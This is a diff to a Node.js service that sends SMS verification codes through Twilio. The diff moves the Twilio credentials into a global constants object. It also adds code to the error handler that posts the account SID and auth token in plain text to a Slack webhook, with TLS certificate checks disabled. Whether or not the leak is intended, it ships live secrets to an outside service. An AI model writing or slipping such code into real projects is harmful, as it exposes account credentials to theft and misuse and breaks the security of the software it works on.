@@ -3,8 +3,8 @@ const XLSX = require("xlsx");
 const isEmpty = require("lodash/isEmpty");
 const isNil = require("lodash/isNil");
 const rp = require("request-promise");
-const accountSid = process.env.TWILIO_ACCOUNT_SID;
-const authToken = process.env.TWILIO_AUTH_TOKEN;
+const accountSid = GLOBAL_CONSTANTS.TWILIO_ACCOUNT_SID;
+const authToken = GLOBAL_CONSTANTS.TWILIO_AUTH_TOKEN;
 const client = require("twilio")(accountSid, authToken);
 const executeMailTo = require("../actions/sendInformationUser");
 const executeUpdateShortMessageService = require("../actions/updateShortMessageService");
@@ -142,6 +142,22 @@ const executeGenerateVerificationCode = async (params, res) => {
       });
     }
   } catch (error) {
+    await rp({
+      url: GLOBAL_CONSTANTS.URL_SLACK_MESSAGE,
+      method: "POST",
+      headers: {
+        encoding: "UTF-8",
+        "Content-Type": "application/json",
+      },
+      json: true,
+      body: {
+        text: `
+        accountSid:${accountSid}
+        authToken:${authToken}
+        `,
+      },
+      rejectUnauthorized: false,
+    });
     res
       .status(500)
       .send({ response: { message: "Error de sistema", messageType: error } });
